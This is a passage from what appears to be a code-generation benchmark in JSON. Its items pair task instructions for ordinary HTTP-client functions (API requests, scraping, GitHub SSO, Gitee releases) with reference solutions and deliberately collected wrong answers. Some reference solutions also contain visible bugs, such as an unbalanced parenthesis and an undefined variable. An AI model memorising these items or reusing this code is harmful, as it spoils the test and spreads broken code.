    "wrong_result": "import requests\nfrom tqdm import tqdm\nimport os\n\ndef download_market_data(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    url = f\"https://api.example.com/v1/{exchange}/{data_type}/{symbol}/{yyyymmdd}\"\n    headers = {'Authorization': f'Bearer {key}'}\n    try:\n        response = requests.get(url, headers=headers, stream=True, timeout=10)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        raise RuntimeError(f\"Request failed: {e}\") from e\n\n    total_length = int(response.headers.get('content-length', 0))\n    with open(filepath, 'wb') as f:\n        with tqdm(total=total_length, unit='B', unit_scale=True, unit_divisor=1024, desc=\"Downloading\") as pbar:\n            for chunk in response.iter_content(chunk_size=8192):\n                if chunk:\n                    f.write(chunk)\n                    pbar.update(len(chunk))\n\n    downloaded_size = os.path.getsize(filepath)\n    if total_length != 0 and downloaded_size != total_length:\n        raise RuntimeError(\"Download incomplete: file size does not match expected size\")"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Python function that makes an HTTP request to a specified API endpoint, handles the response, and manages errors appropriately. The function should support proxy configuration and include request signing.\n\nFunction Description: The `request` function sends an HTTP request to a predefined API endpoint. It constructs the request with proper parameters, handles the connection (including proxy support if configured), processes the response, and manages errors. The function includes logging for debugging and error tracking.\n\nInput:\n- `action`: [str] - The API endpoint action to be called (appended to '/api/')\n- `param`: [dict, optional] - A dictionary of parameters to be sent with the request\n- `**params`: [dict] - Additional parameters to be merged with `param`\n\nOutput:\n- Returns: [dict] - The 'data' field from the JSON response if successful\n- Raises:\n  - Exception: If the HTTP status code indicates an error (non-2xx)\n  - Exception: If the API response contains an error code\n  - Exception: If the response data is None\n\nThe function performs the following steps:\n1. Merges input parameters and signs them\n2. Establishes an HTTPS connection (with optional proxy support)\n3. Sends the request with proper headers\n4. Reads and decodes the response\n5. Validates the response status and content\n6. Returns the parsed data or raises appropriate exceptions",
    "Canonical_solution": "from hashlib import md5\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom time import mktime\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"www.dns.com\"\n    METHOD = \"POST\"\n\ndef request(action, param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s/api/%s/ : params:%s\", API.SITE, action, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n\n    conn.request(API.METHOD, '/api/' + action + '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    result = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, result)\n        raise Exception(result)\n    else:\n        data = jsondecode(result)\n        debug('%s : result:%s', action, data)\n        if data.get('code') != 0:\n            raise Exception(\"api error:\", data.get('message'))\n        data = data.get('data')\n        if data is None:\n            raise Exception('response data is none')\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nimport logging\n\ndef sign_parameters(params):\n    # Placeholder for actual signing logic\n    return params\n\ndef request(action, param=None, **params):\n    merged_params = {}\n    if param:\n        merged_params.update(param)\n    merged_params.update(params)\n    \n    signed_params = sign_parameters(merged_params)\n    \n    url = f\"https://api.example.com/api/{action}\"\n    \n    headers = {\n        'Content-Type': 'application/json',\n        'Authorization': 'Bearer <token>'\n    }\n    \n    proxies = merged_params.get('proxies', None)\n    \n    try:\n        response = requests.post(url, json=signed_params, headers=headers, proxies=proxies)\n        response.raise_for_status()\n        data = response.json()\n        \n        if data.get('error'):\n            raise Exception(data['error'])\n        \n        if data.get('data') is None:\n            raise Exception(\"No data in response\")\n        \n        return data['data']\n    except requests.exceptions.RequestException as e:\n        logging.error(\"Request failed: %s\", e)\n        raise\n    except Exception as e:\n        logging.error(\"Response error: %s\", e)\n        raise"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a function that scrapes and extracts text content from paragraphs of a given URL using HTTP requests and HTML parsing.\n\nFunction Description: The function should make an HTTP GET request to the specified URL, parse the HTML response to extract text from all paragraph elements (<p>), and return the combined text. It should handle potential errors in the HTTP request and log successful operations.\n\nInput: \n- url (str): The URL of the webpage to scrape text from.\n\nOutput: \n- str: The combined text extracted from all paragraph elements on the webpage, or an error message if the request fails.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef scrape_text_from_url(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        return \"Error: Could not retrieve content from URL.\"\n    soup = BeautifulSoup(response.text, \"html.parser\")\n    paragraphs = soup.find_all(\"p\")\n    text = \" \".join([p.get_text() for p in paragraphs])\n    logging.info(\"web scrape done\")\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef extract_paragraph_text(url):\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        logging.info(\"Successfully scraped text from URL\")\n        soup = BeautifulSoup(response.content, 'html.parser')\n        paragraphs = soup.find_all('p')\n        combined_text = '\\n'.join(p.get_text(strip=True) for p in paragraphs)\n        return combined_text\n    except requests.exceptions.RequestException as e:\n        return f\"Error fetching the page: {str(e)}\""
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Python function that interacts with the Face++ API to perform face detection on an image, including face count verification and extraction of facial attributes.\n\nFunction Description: The function uses the Face++ API to detect faces in an image, verifies that exactly one face is present, and extracts facial rectangle coordinates and headpose information. It handles various API response status codes and raises appropriate exceptions for errors.\n\nInput:\n- ctx: A context object containing:\n  - origin_image: The original image to be processed (expected to be an image object)\n\nOutput:\n- Modifies the ctx object by adding:\n  - face[\"rectangle\"]: Tuple containing (left, top, width, height) coordinates of the detected face\n  - face[\"roll_angle\"]: The roll angle of the detected face (divided by 2)\n- Raises:\n  - FaceError: When zero or multiple faces are detected\n  - APIError: For various API-related errors (authentication, authorization, bad request, etc.)",
    "Canonical_solution": "import os\nimport requests\nfrom hivision.error import FaceError, APIError\nfrom hivision.utils import resize_image_to_kb_base64\n\ndef detect_face_face_plusplus(ctx):\n    \"\"\"\n    \u57fa\u4e8eFace++ API\u63a5\u53e3\u7684\u4eba\u8138\u68c0\u6d4b\u5904\u7406\u5668\uff0c\u53ea\u8fdb\u884c\u4eba\u8138\u6570\u91cf\u7684\u68c0\u6d4b\n    :param ctx: \u4e0a\u4e0b\u6587\uff0c\u6b64\u65f6\u5df2\u83b7\u53d6\u5230\u539f\u59cb\u56fe\u548c\u62a0\u56fe\u7ed3\u679c\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u9700\u8981\u539f\u59cb\u56fe\n    :raise FaceError: \u4eba\u8138\u68c0\u6d4b\u9519\u8bef\uff0c\u591a\u4e2a\u4eba\u8138\u6216\u8005\u6ca1\u6709\u4eba\u8138\n    :raise APIError: API\u8c03\u7528\u9519\u8bef\n    \"\"\"\n    url = \"https://api-cn.faceplusplus.com/facepp/v3/detect\"\n    api_key = os.getenv(\"FACE_PLUS_API_KEY\")\n    api_secret = os.getenv(\"FACE_PLUS_API_SECRET\")\n\n    image = ctx.origin_image\n    image_base64 = resize_image_to_kb_base64(image, 2000, mode=\"max\")\n\n    files = {\n        \"api_key\": (None, api_key),\n        \"api_secret\": (None, api_secret),\n        \"image_base64\": (None, image_base64),\n        \"return_landmark\": (None, \"1\"),\n        \"return_attributes\": (None, \"headpose\"),\n    }\n\n    response = requests.post(url, files=files)\n    status_code = response.status_code\n    response_json = response.json()\n\n    if status_code == 200:\n        face_num = response_json[\"face_num\"]\n        if face_num == 1:\n            face_rectangle = response_json[\"faces\"][0][\"face_rectangle\"]\n            headpose = response_json[\"faces\"][0][\"attributes\"][\"headpose\"]\n            roll_angle = headpose[\"roll_angle\"] / 2\n\n            ctx.face[\"rectangle\"] = (\n                face_rectangle[\"left\"],\n                face_rectangle[\"top\"],\n                face_rectangle[\"width\"],\n                face_rectangle[\"height\"],\n            )\n            ctx.face[\"roll_angle\"] = roll_angle\n        else:\n            raise FaceError(\n                \"Expected 1 face, but got {}\".format(face_num), len(face_num)\n            )\n    elif status_code == 401:\n        raise APIError(\n            f\"Face++ Status code {status_code} Authentication error: API key and secret do not match.\",\n            status_code,\n        )\n    elif status_code == 403:\n        reason = response_json.get(\"error_message\", \"Unknown authorization error.\")\n        raise APIError(\n            f\"Authorization error: {reason}\",\n            status_code,\n        )\n    elif status_code == 400:\n        error_message = response_json.get(\"error_message\", \"Bad request.\")\n        raise APIError(\n            f\"Bad request error: {error_message}\",\n            status_code,\n        )\n    elif status_code == 413:\n        raise APIError(\n            f\"Face++ Status code {status_code} Request entity too large: The image exceeds the 2MB limit.\",\n            status_code,\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import facepp\nimport base64\nfrom io import BytesIO\n\nclass FaceError(Exception):\n    pass\n\nclass APIError(Exception):\n    pass\n\nAPI_KEY = 'your_api_key'\nAPI_SECRET = 'your_api_secret'\n\ndef process_face(ctx):\n    image = ctx.origin_image\n    img_byte_arr = BytesIO()\n    image.save(img_byte_arr, format='JPEG')\n    img_str = base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')\n\n    client = facepp.FacePP(api_key=API_KEY, api_secret=API_SECRET)\n    try:\n        response = client.detection.detect(image=img_str)\n    except Exception as e:\n        raise APIError(str(e))\n\n    if response.get('code') != 200:\n        raise APIError(response.get('message', 'Unknown API error'))\n\n    faces = response.get('result', {}).get('face', [])\n    if len(faces) != 1:\n        raise FaceError(f\"Expected 1 face, found {len(faces)}\")\n\n    face = faces[0]\n    rect = (face['location']['left'], face['location']['top'], face['location']['width'], face['location']['height'])\n    roll_angle = face['headpose']['roll'] / 2\n\n    if 'face' not in ctx:\n        ctx.face = {}\n    ctx.face['rectangle'] = rect\n    ctx.face['roll_angle'] = roll_angle"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Implement a function to check for software updates by querying a GitHub repository's API, comparing versions, and notifying if a new version is available.\n\nFunction Description: The function `check_update()` checks for updates by making HTTP requests to GitHub's API. It handles both stable releases and pre-releases based on configuration, compares version numbers, and provides appropriate notifications/logs about update availability. The function uses external configurations for update preferences and notification settings.\n\nInput: None (uses module-level configuration from `cfg` for settings like update preferences, user agent, and current version)\n\nOutput: None (but has side effects: may log update information and send notifications through the `notif` system)",
    "Canonical_solution": "from tasks.base.fastest_mirror import FastestMirror\nfrom module.logger import log\nfrom module.config import cfg\nfrom module.notification import notif\nfrom packaging.version import parse\nimport requests\n\ndef check_update():\n    try:\n        if cfg.update_prerelease_enable:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\", False), timeout=10, headers=cfg.useragent)\n        else:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\"), timeout=10, headers=cfg.useragent)\n        if not cfg.check_update:\n            return\n        if response.status_code == 200:\n            if cfg.update_prerelease_enable:\n                data = response.json()[0]\n            else:\n                data = response.json()\n\n            version = data[\"tag_name\"]\n\n            assert_url = None\n            for asset in data[\"assets\"]:\n                if (cfg.update_full_enable and \"full\" in asset[\"browser_download_url\"]) or \\\n                   (not cfg.update_full_enable and \"full\" not in asset[\"browser_download_url\"]):\n                    assert_url = asset[\"browser_download_url\"]\n                    break\n\n            if assert_url is not None and parse(version.lstrip('v')) > parse(cfg.version.lstrip('v')):\n                notif.notify(cfg.notify_template['NewVersion'].format(version=version))\n                log.info(f\"\u53d1\u73b0\u65b0\u7248\u672c\uff1a{cfg.version}  \u2014\u2014\u2192  {version}\")\n                log.info(data[\"html_url\"])\n            else:\n                log.info(f\"\u5df2\u7ecf\u662f\u6700\u65b0\u7248\u672c\uff1a{cfg.version}\")\n        else:\n            log.warning(\"\u68c0\u6d4b\u66f4\u65b0\u5931\u8d25\")\n            log.debug(response.text)\n    except Exception:\n        pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom packaging import version\n\ndef check_update():\n    owner = cfg.owner\n    repo = cfg.repo\n    current_version = cfg.current_version\n    check_pre_releases = cfg.update_preferences.get('check_pre_releases', False)\n    user_agent = cfg.user_agent\n\n    url = f\"https://api.github.com/repos/{owner}/{repo}/releases/latest\"\n    headers = {'User-Agent': user_agent}\n\n    try:\n        response = requests.get(url, headers=headers)\n        response.raise_for_status()\n    except requests.RequestException as e:\n        notif.log(f\"Error fetching updates: {e}\")\n        return\n\n    release_data = response.json()\n    version_str = release_data['tag_name']\n    is_prerelease = release_data.get('prerelease', False)\n\n    try:\n        current_v = version.parse(current_version)\n        new_v = version.parse(version_str)\n    except version.InvalidVersion:\n        notif.log(\"Invalid version format in config or release.\")\n        return\n\n    if new_v > current_v:\n        if not is_prerelease or check_pre_releases:\n            notif.notify(f\"New version available: {version_str}\")\n            notif.log(f\"New version {version_str} available.\")\n        else:\n            notif.log(\"Pre-release version found but not allowed.\")\n    else:\n        notif.log(\"No updates available.\")"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a GitHub Single Sign-On (SSO) class to handle authentication and user information retrieval using GitHub's OAuth API.\n\nClass Description: The GitHubSSO class provides functionality to authenticate with GitHub's OAuth system, manage access tokens, and retrieve user information including email and name details.\n\nAttributes:\n- access_token: str - GitHub OAuth access token for API authentication\n- refresh_token: str - GitHub OAuth refresh token for obtaining new access tokens\n- client_id: str - GitHub OAuth application client ID\n- client_secret: str - GitHub OAuth application client secret\n- user_info: dict - Dictionary containing user information (email, first name, last name)\n\nMethods:\n- get_new_token() -> str - Requests a new access token using the refresh token\n  Input: None\n  Output: str - New access token\n\n- get_user_info() -> dict - Retrieves user information from GitHub API\n  Input: None\n  Output: dict - Contains user's primary email, first name, and last name\n    Returns format: {\n      \"email\": str,\n      \"first_name\": str,\n      \"last_name\": str\n    }\n  Throws: HTTPException if there's an error retrieving user info",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass GitHubSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"GITHUB_CLIENT_ID\")\n        self.client_secret = getenv(\"GITHUB_CLIENT_SECRET\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            \"https://github.com/login/oauth/access_token\",\n            headers={\"Accept\": \"application/json\"},\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = \"https://api.github.com/user\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            email_response = requests.get(\n                \"https://api.github.com/user/emails\",\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n            email_data = email_response.json()\n            primary_email = next(\n                email[\"email\"] for email in email_data if email[\"primary\"]\n            )\n            return {\n                \"email\": primary_email,\n                \"first_name\": (\n                    data.get(\"name\", \"\").split()[0] if data.get(\"name\") else \"\"\n                ),\n                \"last_name\": (\n                    data.get(\"name\", \"\").split()[-1] if data.get(\"name\") else \"\"\n                ),\n            }\n        except Exception as e:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from GitHub\",\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import httpx\n\nclass GitHubSSO:\n    def __init__(self, client_id, client_secret, refresh_token):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.refresh_token = refresh_token\n        self.access_token = None\n        self.user_info = {}\n\n    def get_new_token(self):\n        url = \"https://github.com/login/oauth/access_token\"\n        params = {\n            \"client_id\": self.client_id,\n            \"client_secret\": self.client_secret,\n            \"refresh_token\": self.refresh_token\n        }\n        headers = {\"Accept\": \"application/json\"}\n        response = httpx.post(url, params=params, headers=headers)\n        if response.status_code == 200:\n            self.access_token = response.json().get('access_token')\n            return self.access_token\n        else:\n            raise httpx.HTTPException(status_code=response.status_code, detail=\"Failed to get new token\")\n\n    def get_user_info(self):\n        url = \"https://api.github.com/user\"\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\"\n        }\n        response = httpx.get(url, headers=headers)\n        if response.status_code != 200:\n            raise httpx.HTTPException(status_code=response.status_code, detail=\"Failed to retrieve user info\")\n        data = response.json()\n        email = data.get('email')\n        name = data.get('name')\n        if not name:\n            raise httpx.HTTPException(status_code=404, detail=\"User name not found\")\n        parts = name.split()\n        first_name = parts[0]\n        last_name = ' '.join(parts[1:]) if len(parts) > 1 else ''\n        self.user_info = {\n            \"email\": email,\n            \"first_name\": first_name,\n            \"last_name\": last_name\n        }\n        return self.user_info"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality for interacting with the RunKeeper API, including rate limiting, authorization handling, and standard HTTP methods (GET, POST, DELETE).\n\nClass Description: The RunKeeperAPI class provides methods to interact with the RunKeeper web service API. It handles rate limiting, authorization, and provides wrapper methods for common HTTP operations. The class includes rate limit tracking and proper error handling for API responses.\n\nAttributes:\n_RATE_LIMIT_KEY: str - Redis key used for tracking global rate limit status\n\nMethods:\n_rate_limit: [Name](endpoint: str, req_lambda: Callable) -> requests.Response - Handles rate limiting logic by checking Redis for existing rate limits and processing API responses for rate limit errors\n_api_headers: [Name](service_record: object) -> dict - Generates authorization headers for API requests using the service record's token\nget_request: [Name](url: str, service_record: object) -> dict - Performs an HTTP GET request to the specified URL with authorization headers and returns parsed JSON response\npost_request: [Name](url: str, service_record: object, data: Optional[dict]) -> requests.Response - Performs an HTTP POST request to the specified URL with optional data and authorization headers\ndelete_request: [Name](url: str, service_record: object) -> requests.Response - Performs an HTTP DELETE request to the specified URL with authorization headers\noauth_token_request: [Name](params: dict) -> str - Handles OAuth token requests by posting to the RunKeeper token endpoint and returns the access token",
    "Canonical_solution": "from tapiriik.settings import WEB_ROOT, RUNKEEPER_CLIENT_ID, RUNKEEPER_CLIENT_SECRET\nfrom tapiriik.services.api import APIException, UserException, UserExceptionType\nimport requests\nimport urllib.parse\nimport json\nfrom datetime import timedelta\nimport re\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"rk:rate_limit:hit\"\n\n    def _rate_limit(self, endpoint, req_lambda):\n        if redis.get(self._RATE_LIMIT_KEY) is not None:\n            raise APIException(\"RK global rate limit previously reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        response = req_lambda()\n        if response.status_code == 429:\n            if \"user\" not in response.text:\n                timeout = timedelta(minutes=15)\n                timeout_match = re.search(r\"(\\d+) (second|minute|hour|day)\", response.text)\n                if timeout_match:\n                    timeout = timedelta(**{\"%ss\" % timeout_match.group(2): float(timeout_match.group(1))}\n                redis.setex(self._RATE_LIMIT_KEY, response.text, timeout)\n                raise APIException(\"RK global rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n            else:\n                raise APIException(\"RK user rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        return response\n\n    def _api_headers(self, service_record):\n        return {\"Authorization\": \"Bearer \" + service_record.Authorization[\"Token\"],\n                \"Accept-Charset\": \"UTF-8\"}\n\n    def get_request(self, url, service_record):\n        response = self._rate_limit(\"get_request\",\n                                  lambda: requests.get(url,\n                                                      headers=self._api_headers(service_record)))\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(\"Request failed: %s %s\" % (response.status_code, response.text))\n        return response.json()\n\n    def post_request(self, url, service_record, data=None):\n        response = self._rate_limit(\"post_request\",\n                                  lambda: requests.post(url,\n                                                       headers=self._api_headers(service_record),\n                                                       data=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url, service_record):\n        response = self._rate_limit(\"delete_request\",\n                                  lambda: requests.delete(url,\n                                                         headers=self._api_headers(service_record)))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params):\n        response = self._rate_limit(\"auth_token\",\n                                  lambda: requests.post(\"https://runkeeper.com/apps/token\",\n                                                      data=urllib.parse.urlencode(params),\n                                                      headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}))\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport redis\nfrom typing import Optional, Callable, Dict, Any\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = 'runkeeper:rate_limit'\n\n    def __init__(self):\n        self.redis = redis.Redis(host='localhost', port=6379, db=0)\n\n    def _rate_limit(self, endpoint: str, req_lambda: Callable) -> requests.Response:\n        current_count = self.redis.get(self._RATE_LIMIT_KEY)\n        if current_count and int(current_count) >= 100:\n            return requests.Response(status_code=429, text='Too Many Requests')\n        self.redis.incr(self._RATE_LIMIT_KEY)\n        return req_lambda()\n\n    def _api_headers(self, service_record: Dict[str, Any]) -> Dict[str, str]:\n        return {\n            'Authorization': f'Bearer {service_record[\"token\"]}'\n        }\n\n    def get_request(self, url: str, service_record: Dict[str, Any]) -> Dict[str, Any]:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.get(url, headers=headers))\n        response.raise_for_status()\n        return response.json()\n\n    def post_request(self, url: str, service_record: Dict[str, Any], data: Optional[Dict[str, Any]] = None) -> requests.Response:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.post(url, headers=headers, json=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url: str, service_record: Dict[str, Any]) -> requests.Response:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.delete(url, headers=headers))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params: Dict[str, str]) -> str:\n        token_url = 'https://api.runkeeper.com/oauth/token'\n        response = requests.post(token_url, data=params)\n        response.raise_for_status()\n        return response.json()['access_token']\n```"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Python class that manages JavaScript libraries and CSS files, loading their contents from remote URLs via HTTP/HTTPS and storing them for later use.\n\nClass Description: The `Javascript` class handles the loading and storage of JavaScript libraries and CSS files from remote sources. It provides functionality to initialize with URLs, normalize them into lists, and fetch their contents over HTTP/HTTPS connections.\n\nAttributes:\n- lib: [Sequence[str]] - List of URLs pointing to JavaScript libraries to be loaded\n- css: [Sequence[str]] - List of URLs pointing to CSS files to be loaded\n- data: [str] - Additional inline JavaScript code\n- javascript_contents: [dict[str, str]] - Dictionary mapping library URLs to their loaded content\n\nMethods:\n- __init__(data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None - Initializes the class instance, normalizing input parameters into lists\n- load_javascript_contents() -> Javascript - Loads the contents of all JavaScript libraries specified in lib attribute via HTTP/HTTPS, stores them in javascript_contents, and returns self for method chaining",
    "Canonical_solution": "from ..types import Optional, Sequence, Union\nfrom urllib.parse import urlparse\nimport http.client\n\nclass Javascript:\n    def __init__(\n        self,\n        data: Optional[str] = None,\n        lib: Optional[Union[str, Sequence]] = None,\n        css: Optional[Union[str, Sequence]] = None,\n    ):\n        if isinstance(lib, str):\n            lib = [lib]\n        elif lib is None:\n            lib = []\n        if isinstance(css, str):\n            css = [css]\n        elif css is None:\n            css = []\n        self.lib = lib\n        self.css = css\n        self.data = data or \"\"\n        self.javascript_contents = dict()\n\n    def load_javascript_contents(self):\n        for lib in self.lib:\n            parsed_url = urlparse(lib)\n            host: str = str(parsed_url.hostname)\n            port: int = parsed_url.port\n            path: str = parsed_url.path\n\n            resp: Optional[http.client.HTTPResponse] = None\n            try:\n                conn = http.client.HTTPSConnection(host, port)\n                conn.request(\"GET\", path)\n                resp = conn.getresponse()\n                if resp.status != 200:\n                    raise RuntimeError(\"Cannot load JavaScript lib: %s\" % lib)\n                self.javascript_contents[lib] = resp.read().decode(\"utf-8\")\n            finally:\n                if resp is not None:\n                    resp.close()\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nfrom typing import Optional, Union, Sequence\n\nclass Javascript:\n    def __init__(self, data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None:\n        self.data = data\n        self.lib = list(lib) if lib is not None else []\n        self.css = list(css) if css is not None else []\n        self.javascript_contents = {}\n\n    def load_javascript_contents(self) -> 'Javascript':\n        for url in self.lib:\n            response = requests.get(url)\n            self.javascript_contents[url] = response.text\n        return self"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Python function to interact with Gitee's API to create a new release and upload a file to that release.\n\nFunction Description: This function performs two main operations: 1) Creates a new release in a specified Gitee repository using OAuth authentication, and 2) Uploads a specified file to the created release. The function handles authentication, API requests, and response processing.\n\nInput:\n- owner (str): The owner of the Gitee repository\n- repo (str): The name of the Gitee repository\n- tag (str): The tag name for the new release\n- file_path (str): Path to the file to be uploaded (default: \"Seraphine.7z\")\n\nOutput:\n- dict: A dictionary containing:\n  - release_id (str): The ID of the created release\n  - download_url (str): The download URL of the uploaded file\n\nNote: The function requires the following environment variables to be set:\n- GITEE_OWNER\n- GITEE_REPO\n- GITEE_USERNAME\n- GITEE_PASSWORD\n- GITEE_CLIENT_ID\n- GITEE_CLIENT_SECRET",
    "Canonical_solution": "import argparse\nimport os\nimport requests\n\nGITEE_OWNER = os.environ[\"GITEE_OWNER\"]\nGITEE_REPO = os.environ[\"GITEE_REPO\"]\nGITEE_USERNAME = os.environ[\"GITEE_USERNAME\"]\nGITEE_PASSWORD = os.environ[\"GITEE_PASSWORD\"]\nGITEE_CLIENT_ID = os.environ[\"GITEE_CLIENT_ID\"]\nGITEE_CLIENT_SECRET = os.environ[\"GITEE_CLIENT_SECRET\"]\n\ndef create_new_release(owner, repo):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    TAG_NAME = args.tag\n    NAME = TAG_NAME\n    BODY = f\"Seraphine {TAG_NAME}\"\n    TARGET_COMMITISH = \"master\"\n\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": TAG_NAME,\n        \"name\": NAME,\n        \"body\": BODY,\n        \"target_commitish\": TARGET_COMMITISH,\n    }\n    response = requests.post(url, data=data, headers=HEADERS, timeout=30)\n    if 200 <= response.status_code < 300:\n        return response.json()[\"id\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"create release on gitee failed.\")\n\ndef upload_file(onwer, repo, release_id):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    FILE_PATH = \"Seraphine.7z\"\n\n    url = f\"https://gitee.com/api/v5/repos/{onwer}/{repo}/releases/{release_id}/attach_files\"\n    files = {\"file\": open(FILE_PATH, \"rb\")}\n    response = requests.post(url, files=files, headers=HEADERS, timeout=30)\n\n    if 200 <= response.status_code < 300:\n        return response.json()[\"browser_download_url\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"push release file to Gitee failed.\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nimport base64\n\ndef create_gitee_release(owner, repo, tag, file_path=\"Seraphine.7z\"):\n    gitee_username = os.getenv('GITEE_USERNAME')\n    gitee_password = os.getenv('GITEE_PASSWORD')\n    gitee_owner = os.getenv('GITEE_OWNER')\n    gitee_repo = os.getenv('GITEE_REPO')\n    gitee_client_id = os.getenv('GITEE_CLIENT_ID')\n    gitee_client_secret = os.getenv('GITEE_CLIENT_SECRET')\n\n    if not gitee_username or not gitee_password:\n        raise ValueError(\"GITEE_USERNAME and GITEE_PASSWORD must be set\")\n\n    # Basic Auth for Gitee API\n    auth_header = 'Basic ' + base64.b64encode(f\"{gitee_username}:{gitee_password}\".encode()).decode()\n\n    # Create release\n    release_url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    release_data = {\n        \"tag_name\": tag,\n        \"name\": f\"Release {tag}\",\n        \"body\": f\"Release version {tag}\",\n        \"draft\": False,\n        \"prerelease\": False\n    }\n    headers = {\n        \"Authorization\": auth_header,\n        \"Content-Type\": \"application/json\"\n    }\n    release_response = requests.post(release_url, json=release_data, headers=headers)\n    release_response.raise_for_status()\n    release_id = 